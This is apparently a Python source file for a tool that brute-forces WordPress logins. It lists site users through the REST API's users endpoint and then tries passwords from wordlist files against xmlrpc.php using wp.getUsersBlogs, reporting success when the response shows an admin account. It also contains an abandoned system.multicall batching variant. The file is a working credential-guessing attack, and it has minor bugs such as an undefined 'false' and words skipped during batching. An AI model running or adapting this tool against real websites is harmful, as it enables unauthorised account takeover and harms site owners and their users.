import requests
import urllib3
import json
import sys
import utils
from utils import die, dump
from configuration import getConf
import glob


# Remove unnesseray warning related to certificate
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class BruteForcer:

    domain = ''
    verify = not getConf('dev.ignoreCertificate')  # Useful for local testing.

    def __init__(self, domain):
        self.domain = domain
    

    # Handles the all the logic
    # from various checks, retrieving the users and performing the bruteforcing...
    def run(self):

        if not self.check_domain():
            print('❌ It seems the domain is wong, or the API / XMLRPC is not available.')
            die()
    
        userlist = self.get_user_list()
        if len(userlist) == 0:
            print(f"❗ No users found for {self.domain}. Terminating.")
            die()
        else:
            print('🌟 Found a total of '+ str(len(userlist)) +' user(s):')
            
        for user in userlist:
            # we use "slug" which is more likeky the username 
            # while "name" can be customized to be, for example, firstname + lastname
            self.begin_bruteforce(user['slug'])


    
    # Returns True if the wordpress rest API is available for the given website, false otherwise.
    # TODO: For the fun, add some verification other than status_code != 200 :)
    def check_domain(self):
    
        url_api = f"{self.domain}/wp-json"
        url_xmlrpc = f"{self.domain}/xmlrpc.php"

        # Check if API is available first
        try:
            print(f"Testing url rest API...", end=" ")
            response_api = requests.get(url_api, timeout=5, verify=self.verify)
            if response_api.status_code == 200:
                print('✅ OK')
            else:
                return False
        except requests.exceptions.RequestException as e:
            print(e)
            return false
    
        # Then check if XMLRPC is available too
        try:
            print(f"Now testing url XMLRPC...", end=" ")
            response_xmlrpc = requests.post(url_xmlrpc, timeout=5, verify=self.verify) # xmlrpc uses only POST.
            if response_xmlrpc.status_code == 200:
                print('✅ OK')
            else:
                return False
        except requests.exceptions.RequestException as e:
            print(e)
            return false
    
        return True
    

    def simulate_login(self):
        login_url = f"{self.domain.rstrip('/')}/wp-login.php"
    
        username = input("Username for login test: ")
        password = input("Password for login test: ")
    
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{self.domain}/wp-admin/",
            'testcookie': '1'
        }
    
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    
        try:
            response = requests.post(login_url, data=payload, headers=headers, timeout=5)
            print(f"\n[POST] {login_url}")
            print(f"Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")
            print(f"Headers: {response.headers}")
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] POST request failed: {e}")
    

    # Returns the list of users of the given website, interrogating the WP rest API.
    def get_user_list(self):
        url = f"{self.domain}/wp-json/wp/v2/users"
    
        try:
    
            # Try to get user list
            print(f"\nRetrieving user list...", end=" ")
            response = requests.get(url, timeout=5, verify=self.verify)
    
            #print(f"\n[GET] {url}")
            #print(f"Status Code: {response.status_code}")
            #print(f"Headers: {response.headers}")
            #print(f"Body (truncated):\n{response.text[:200]}")
        except requests.exceptions.RequestException as e:
            print(e)
            return []
    
        if response.status_code != 200:
            print('❌ Server did not respond status 200.')
            return []
    
        # At this point we have correctly recieved a response from the API
        # Lets read the json response
        try:
            userList = json.loads(response.text)
            print(f"Done!")
        except (json.JSONDecodeError, ValueError):
            print("❌ Response is not valid JSON.")
            userList = []
    
        return userList
    

    def begin_bruteforce(self, username):
        print(f"Begining the bruteforce for user {username}...")

        # empty the file before testing
        if getConf('dev.debugmode') == True:
            with open("log/requests.log", "w", encoding="utf-8") as file:
                file.write("")

        # We read the available dictionnaries
        for file_path in glob.glob("dictionnaries/*.txt"):
            print(f"Reading {file_path}")
            
            # We read lines one by one to avoid loading entire huge files that can cause memory issues
            passwords_tested = 0 # we test multiple passwords at once for performance
            passwords_set = [] # we test multiple passwords at once for performance
            found = False
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                for line in file:
                    word = line.strip()
                    if word:
                        # we test the password
                        passwords_tested = passwords_tested + 1

                        # test passwords 5 by 5
                        if len(passwords_set) == 5:
                            found = self.testPasswords(username, passwords_set)
                            passwords_set = []
                        else:
                            passwords_set.append(word)

                    # Some logging...
                    if passwords_tested % 50 == 0:
                        print(f"Tested {passwords_tested} passwords so far")

            # If password was not found and there is some passwords left untested because 
            # the total number of passwords is not a multiple of 5, we perform the check on these
            if found == False and len(passwords_set) != 0:
                found = self.testPasswords(username, passwords_set)
                

    # Usus xmlrpc to check if a given password works for a given user.
    # BTW, Wordpress has a python library: xmlrpc.client but FI
    def testPasswords(self, username, passwords):
        url_xmlrpc = f"{self.domain}/xmlrpc.php"

        for password in passwords:
            
            # Build XML-RPC payload
            request_body = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                    <param>
                        <value><string>{username}</string></value>
                    </param>
                    <param>
                        <value><string>{password}</string></value>
                    </param>
                </params>
            </methodCall>
            """

            response = requests.post(
                url_xmlrpc,
                data=request_body.strip(),
                headers={'Content-Type': 'text/xml'},
                timeout=5,
                verify=self.verify
            )

            # Log the reponses
            if getConf('dev.debugmode') == True:
                with open("log/requests.log", "a", encoding="utf-8") as file:
                    file.write("Results for passwords:"+' '.join(passwords)+"\n")
                    file.write("<=============== REQUEST BODY ===============>\n")
                    file.write(f"{request_body}\n")
                    file.write("<=============== END REQUEST BODY - START RESPONSE BODY ===============>\n")
                    file.write(response.text)
                    file.write("<=============== END RESPONSE BODY ===============>\n\n\n")

            # TODO: better handling. Ideally wait and retry but FI.
            if response.status_code != 200:
                return False

            if '<name>isAdmin</name>' in response.text:
                print(f"✅ SUCCESS → The password '{password}' is valid for the user '{username}' !")
                die()

        return False
        

    # return the password of a given username if found.
    # Must pass a set of passwords to make best use of xmlrpc's system.multicall feature
    # NOTE: DOES NOT WORK LOL because the behaviour of Wordpress using system.multicall is 
    # "quirky" since if the first authentication in the stack fails, wordpress assumes it will fail for the rest of the stack!
    # which mean litteraly: if 1st test is false then all batch is false QQ
    # So we must perform an authentication one by one.
    def testPasswords_using_multicall(self, username, passwords):
        url_xmlrpc = f"{self.domain}/xmlrpc.php"
        
        # Build XML-RPC payload
        # xmlrpc allows multiple executions at once, which we want to use to save our time
        request_body = """<?xml version="1.0"?><methodCall>
        <methodName>system.multicall</methodName><params><param><value><array><data>\n\n"""

        for password in passwords:
            request_body = request_body + f"""
                <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array>
                    <data>
                        <value>
                            <string>{username}</string>
                        </value>
                        <value>
                            <string>{password}</string>
                        </value>
                    </data>
                </array></value></data></array></value></member></struct></value>\n"""

        request_body = request_body + """</data></array></value></param></params></methodCall>\n\n"""

        try:
            response = requests.post(
                url_xmlrpc,
                data=request_body.strip(),
                headers={'Content-Type': 'text/xml'},
                timeout=5,
                verify=self.verify
            )

            # Log the reponses
            if getConf('dev.debugmode') == True:
                with open("log/requests.log", "a", encoding="utf-8") as file:
                    file.write("Results for passwords:"+' '.join(passwords)+"\n")
                    file.write("<=============== REQUEST BODY ===============>\n")
                    file.write(f"{request_body}\n")
                    file.write("<=============== END REQUEST BODY - START RESPONSE BODY ===============>\n")
                    file.write(response.text+"\n")
                    file.write("<=============== END RESPONSE BODY ===============>\n\n\n")

            # TODO: better handling. Ideally wait and retry but FI.
            if response.status_code != 200:
                return False

            # We look for the string '<name>isAdmin</name>', which means an admin 
            # account have been found since the other accounts do not mention their status
            # We just need to check the passwords one by one to determine what is the right one in our set
            if '<name>isAdmin</name>' in response.text:

                print(f"Hey!! A password is valid in the set!")

                for password in passwords:
                    request_body = f"""
                    <?xml version="1.0" encoding="UTF-8"?>
                    <methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param>
                                <value><string>{username}</string></value>
                            </param>
                            <param>
                                <value><string>{password}</string></value>
                            </param>
                        </params>
                    </methodCall>
                    """

                    response = requests.post(
                        url_xmlrpc,
                        data=request_body.strip(),
                        headers={'Content-Type': 'text/xml'},
                        timeout=5,
                        verify=self.verify
                    )

                    if '<name>isAdmin</name>' in response.text:
                        print(f"✅ SUCCESS → Username: '{username}', Password: '{password}'")
                        return password  # Or break if you only want one valid result

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] While testing '{password}': {e}")
            # Do not return; just continue trying other passwords

        return False
        